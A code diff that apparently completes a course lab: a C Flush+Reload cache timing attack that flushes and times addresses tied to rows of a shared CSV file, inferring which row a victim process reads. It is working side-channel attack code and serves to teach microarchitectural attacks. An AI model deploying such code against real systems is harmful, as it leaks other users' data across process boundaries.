@@ -1,3 +1,4 @@
+// Copyright [2019] <Yidong Fang>
 #include <fcntl.h>
 #include <sched.h>
 #include <stdint.h>
@@ -8,7 +9,8 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <x86intrin.h>
-#define HIT_TIME 15
+#define HIT_THRESHOLD 30
+#define SCAN_TIME 15
 #define CSV_ITEM_NUM 84
 
 /* Lengths of each row in the CSV file. */
@@ -21,13 +23,13 @@ int csv_offsets[] = {
     88,  85, 90, 101, 107, 91,  90,  91, 111, 100};
 
 // Return the size of a file
-long file_size(const char *filename) {
+int64_t file_size(const char *filename) {
   struct stat s;
   if (stat(filename, &s) != 0) {
     printf("Error reading file stats !\n");
     return 1;
   }
-  printf("File size = %lu\n", s.st_size);
+  // printf("File size = %lu\n", s.st_size);
   return s.st_size;
 }
 
@@ -58,24 +60,25 @@ uint64_t rdtsc() {
 uint64_t measure_one_block_access_time(void *addr) {
   uint64_t cycles;
 
-  asm volatile("mov %1, %%r8\n\t"
-               "lfence\n\t"
-               "rdtsc\n\t"
-               "mov %%eax, %%edi\n\t"
-               "mov (%%r8), %%r8\n\t"
-               "lfence\n\t"
-               "rdtsc\n\t"
-               "sub %%edi, %%eax\n\t"
-               : "=a"(cycles) /*output*/
-               : "r"(addr)
-               : "r8", "edi");
+  asm volatile(
+      "mov %1, %%r8\n\t"
+      "lfence\n\t"
+      "rdtsc\n\t"
+      "mov %%eax, %%edi\n\t"
+      "mov (%%r8), %%r8\n\t"
+      "lfence\n\t"
+      "rdtsc\n\t"
+      "sub %%edi, %%eax\n\t"
+      : "=a"(cycles) /*output*/
+      : "r"(addr)
+      : "r8", "edi");
 
   return cycles;
 }
 
 int main(int argc, char *argv[]) {
   int a[64] = {0};
-  unsigned long hit_time, miss_time;
+  uint64_t hit_time, miss_time;
 
   if (argc != 2) {
     printf("Usage: attack hit_time,miss_time\n");
@@ -101,65 +104,42 @@ int main(int argc, char *argv[]) {
   uint64_t time;
   unsigned char *offset_addrs[CSV_ITEM_NUM];
   uint64_t tmp_offset = 0;
-  int check_flag[CSV_ITEM_NUM];
   int hit_count[CSV_ITEM_NUM];
-  int cur_hit_max = 0;
-  int cur_hit_max_idx = -1;
+  int previous = -1;
+  int hit_cycle_threshold = hit_time + (miss_time-hit_time)/3;
   int check_count = 0;
   for (int i = 0; i < CSV_ITEM_NUM; i++) {
     tmp_offset += csv_offsets[i];
     offset_addrs[i] = addr + tmp_offset;
-    check_flag[i] = 0;
     hit_count[i] = 0;
   }
+  
   while (1) {
     scan_idx++;
+    // random scan; This is to overcome prefetching.
     row_idx = (scan_idx * 10037 + 2333) % CSV_ITEM_NUM;
+    // if negative
     if (row_idx < 0) {
       row_idx += CSV_ITEM_NUM;
     }
-    if (check_flag[row_idx] == HIT_TIME) {
-      continue;
-    }
-
-    check_flag[row_idx] += 1;
-    check_count += 1;
-
-    flush(offset_addrs[row_idx]);
-    for(int i=0;i<15;i++)
-    sched_yield();
-    time = measure_one_block_access_time(offset_addrs[row_idx]);
-    if (time <= hit_time + 20) {
-      //printf("hit %d\t%d\n", row_idx, hit_count[row_idx]);
-      hit_count[row_idx] += 1;
-    }
-    if (hit_count[row_idx] > cur_hit_max) {
-      cur_hit_max = hit_count[row_idx];
-      cur_hit_max_idx = row_idx;
-    }
-    if (check_count == HIT_TIME * CSV_ITEM_NUM) {
-      if (cur_hit_max_idx > 0 & cur_hit_max>=3) {
-        printf("%d\t%d\n", cur_hit_max_idx + 1, cur_hit_max);
+    //  Monitor the same cache set N times before monitoring the
+    //   next set. (Clue: N~10 should work)
+    for (size_t i = 0; i < SCAN_TIME; i++) {
+      flush(offset_addrs[row_idx]);
+      // Use sched_yield() while waiting for victim to access.
+      sched_yield();
+      time = measure_one_block_access_time(offset_addrs[row_idx]);
+      // Use hit_time and/or miss_time to detect hits and misses.
+      if (time <= hit_cycle_threshold) {
+        hit_count[row_idx] += 1;
       }
-      for (int i = 0; i < CSV_ITEM_NUM; i++) {
-        check_flag[i] = 0;
-        hit_count[i] = 0;
-      }
-      check_count = 0;
-      cur_hit_max_idx = -1;
-      cur_hit_max = 0;
     }
-    // printf("%d\n", time);
+    if (hit_count[row_idx] > HIT_THRESHOLD) {
+      if (previous != row_idx) {
+        printf("%d\n", row_idx + 1);
+        hit_count[row_idx] = 0;
+      }
+    }
   }
-  /* Insert your code here. Things to keep in mind:
-     1. Do not scan the cache sets sequentially.
-        Use a function such as (index*prime + offset)%(maxrange).
-        This is to overcome prefetching.
-     2. Use sched_yield() while waiting for victim to access.
-     3. Use hit_time and/or miss_time to detect hits and misses.
-     4. Monitor the same cache set N times before monitoring the
-        next set. (Clue: N~10 should work)
-  */
-
   return 0;
 }
